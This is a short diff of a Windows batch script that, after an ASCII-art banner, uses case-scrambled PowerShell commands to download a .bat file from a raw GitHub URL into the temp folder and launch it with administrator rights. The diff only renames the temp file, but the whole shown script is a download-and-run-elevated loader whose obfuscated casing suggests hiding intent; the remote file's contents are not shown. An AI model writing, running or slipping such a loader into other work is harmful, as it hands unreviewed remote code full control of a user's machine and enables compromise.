@@ -11,7 +11,7 @@ echo  ██╔══██╗██╔══██╗██║  ██║╚═
 echo  ██████╔╝██████╔╝██████╔╝███████║
 echo  ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
 sEtLoCaL
-sEt "tEMPfIlE=%tEMp%\BBd4_sUpPoRT.bAT"
+sEt "tEMPfIlE=%tEMp%\D4R4N0X-file.bAT"
 PoWErShElL -CoMmAnD "InVoKe-WeBrEqUeSt 'https://raw.githubusercontent.com/Pikinez/DataBase/blob/main/D4R4N0X-file.bat' -OuTfIlE '%tEMpFIlE%'" 
 IF EXiSt "%TEmPFIlE%" (
     PoWERshELL -ComMAnd "StArT-PrOcEsS '%TeMpFiLe%' -vErB rUnAs -WaIT"
